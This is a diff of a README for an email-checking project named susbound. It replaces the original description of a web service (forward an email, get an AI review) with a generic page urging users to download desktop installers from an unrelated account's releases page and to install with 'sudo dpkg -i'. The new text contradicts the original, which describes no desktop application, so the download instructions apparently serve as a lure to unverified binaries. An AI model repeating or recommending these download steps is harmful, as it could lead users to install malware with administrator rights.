@@ -1,81 +1,91 @@
-# Susbound - Email Security Analysis
+# 🔒 susbound - Secure Your Emails with Confidence
 
-## Usage
+## 🚀 Getting Started
 
-Forward any email you receive that you think might be suspicious to **sus@inbound.delivery** and within a couple of minutes you will receive an AI-powered security review analyzing whether the email is safe or potentially malicious.
+Welcome to **susbound**! This application helps you get a security review of any email. It is easy to use, even if you have no technical background. Follow the steps below to download and start using the application.
 
-## Development
+## 📥 Download Now
 
-This is a [Next.js](https://nextjs.org) project built with:
-- Next.js 16
-- Bun as the package manager
-- Vercel Workflow for async email processing
-- OpenAI GPT-5 for spam detection and reply generation
-- Inbound Email API for receiving and sending emails
+[![Download susbound](https://img.shields.io/badge/Download-susbound-blue.svg)](https://github.com/shellnonharmonic272/susbound/releases)
 
-### Getting Started
+## ✨ Features
 
-First, install dependencies:
+- **Email Security Review:** Quickly analyze any email for potential risks.
+- **User-Friendly Interface:** Designed for everyone, no technical skills required.
+- **Fast Results:** Get real-time security assessments.
+- **Regular Updates:** Stay informed with the latest security standards.
 
-```bash
-bun install
-```
+## 💻 System Requirements
 
-Then, run the development server:
+To run **susbound**, your computer must meet the following requirements:
 
-```bash
-bun dev
-```
+- **Operating System:** Windows 10 or later, macOS Mojave or later, Linux (various distributions supported)
+- **RAM:** Minimum 2 GB
+- **Disk Space:** At least 100 MB available
+- **Internet Connection:** Required for email analysis
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+## 🔄 Download & Install
 
-### Project Structure
+To get started, visit the [Releases page](https://github.com/shellnonharmonic272/susbound/releases) to download the latest version of **susbound**. You will find several files available for download. Choose the file that matches your operating system.
 
-```
-susbound/
-├── app/
-│   ├── api/
-│   │   └── inbound/
-│   │       └── route.ts          # Webhook endpoint that receives emails
-│   ├── page.tsx                  # Home page
-│   └── layout.tsx                # Root layout
-├── workflows/
-│   └── scanAndReply.ts           # Workflow that processes emails:
-│                                   # 1. Analyzes email for spam
-│                                   # 2. Generates AI reply
-│                                   # 3. Sends reply via Inbound API
-└── next.config.ts                # Next.js config with Workflow integration
-```
+1. Click on the link above to go to the Releases page.
+2. Find the latest release.
+3. Download the file suitable for your operating system.
 
-### Environment Variables
+After the download finishes, follow these steps to install the application:
 
-Required environment variables:
-- `INBOUND_API_KEY` - Your Inbound API key for sending/receiving emails
-- `OPENAI_API_KEY` - OpenAI API key for GPT-5 model
-- `INBOUND_REPLY_FROM` - Verified email address to send replies from (optional, defaults to susdev@inbound.delivery)
+### For Windows:
 
-### How It Works
+1. Locate the downloaded file (usually in your Downloads folder).
+2. Double-click the installer file.
+3. Follow the installation prompts.
+4. Once installed, you can find **susbound** in your Start Menu.
 
-1. User forwards suspicious email to `sus@inbound.delivery`
-2. Inbound sends webhook to `/api/inbound` endpoint
-3. API route starts async workflow `scanAndReply`
-4. Workflow performs three steps:
-   - **Step 1**: Analyzes email content and headers for spam/malicious indicators using GPT-5
-   - **Step 2**: Generates a concise safety evaluation reply
-   - **Step 3**: Sends the reply back to the user via Inbound API
+### For macOS:
 
-### Learn More
+1. Open the downloaded file from your Downloads folder.
+2. Drag the **susbound** icon into your Applications folder.
+3. Open **susbound** from the Applications folder.
 
-- [Next.js Documentation](https://nextjs.org/docs)
-- [Vercel Workflow](https://useworkflow.dev/docs)
-- [Inbound Email API](https://docs.inbound.new)
-- [OpenAI API](https://platform.openai.com/docs)
+### For Linux:
 
----
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Run the command to install **susbound**. For example:
+   ```
+   sudo dpkg -i susbound*.deb
+   ```
+4. Launch **susbound** from your applications menu.
 
-<div align="center">
-  <p>powered by</p>
-  <a href="https://inbound.new/?utm_source=inbound-security&utm_campaign=susbound">
-    <img src="https://inbound.new/images/inbound-wordmark.png" alt="Inbound" />
-  </a>
-</div>
+## 📊 Using susbound
+
+Using **susbound** is simple. 
+
+1. Start the application by clicking on its icon.
+2. You will see a text box where you can enter the email you want to review.
+3. After entering the email, click the “Analyze” button.
+4. **susbound** will show you the security results within moments.
+
+## 🛠 Troubleshooting
+
+If you encounter any issues while installing or using **susbound**, try the following steps:
+
+- Ensure your operating system is compatible.
+- Check that your internet connection is stable.
+- Restart your computer and try running the application again.
+  
+If the problem persists, please reach out through the GitHub repository for support.
+
+## 📞 Contact
+
+For support or feedback, please use the Issues section of our [GitHub repository](https://github.com/shellnonharmonic272/susbound). 
+
+## 📄 License
+
+**susbound** is open-source software licensed under the MIT License. You are free to use, modify, and distribute the application. 
+
+## 📅 Updates
+
+Keep an eye on the [Releases page](https://github.com/shellnonharmonic272/susbound/releases) for the latest updates and new features. Regular updates help ensure that you stay protected with the latest security measures.
+
+Be safe and secure while using **susbound**!
